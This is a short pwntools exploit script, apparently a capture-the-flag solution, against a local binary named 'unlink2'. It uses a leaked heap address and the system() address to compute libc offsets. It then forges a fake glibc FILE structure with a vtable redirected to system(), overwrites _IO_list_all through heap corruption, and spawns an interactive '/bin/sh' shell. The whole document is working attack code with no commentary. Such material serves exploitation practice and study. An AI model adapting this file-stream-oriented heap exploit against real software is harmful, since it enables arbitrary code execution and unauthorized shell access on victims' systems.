#!/usr/bin/python

from pwn import *

DEBUG = True

p = process("/home/christmas1/unlink2")

system_offset = 0x45380
puts_offset = 0x6f5d0
iolistall_offset = 0x3c4520

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

r("inside heap (")
heap_leak = int(r(",")[:-1], 16)

r("here is system address: ")
system_addr = int(r(".")[:-1], 16)

libc_base = system_addr - system_offset
iolistall_addr = libc_base + iolistall_offset

#stream_addr = 0x12345678
stream_addr = heap_leak + 0x10
vtable_addr = heap_leak + 0x108


print "Heap: %x" % heap_leak
print "IO_list_all: %x" % iolistall_addr

stream = "/bin/sh\0"		# Fake file stream
stream += p64(0x20 | 1)
stream += p64(stream_addr)
stream += p64(iolistall_addr)
stream += p64(1)
stream += p64(0)
stream = stream.ljust(0xa0, "\x00")
stream += p64(vtable_addr - 0x28)
stream = stream.ljust(0xc0, "\x00")
stream += p64(1)	# Lock
stream += p64(0) * 2
stream += p64(vtable_addr)

payload = stream
payload += p64(1)
payload += p64(2)
payload += p64(3) 
payload += p64(0) * 3 # vtable
payload += p64(system_addr)

p.sendline(payload)

p.interactive()

p.close()

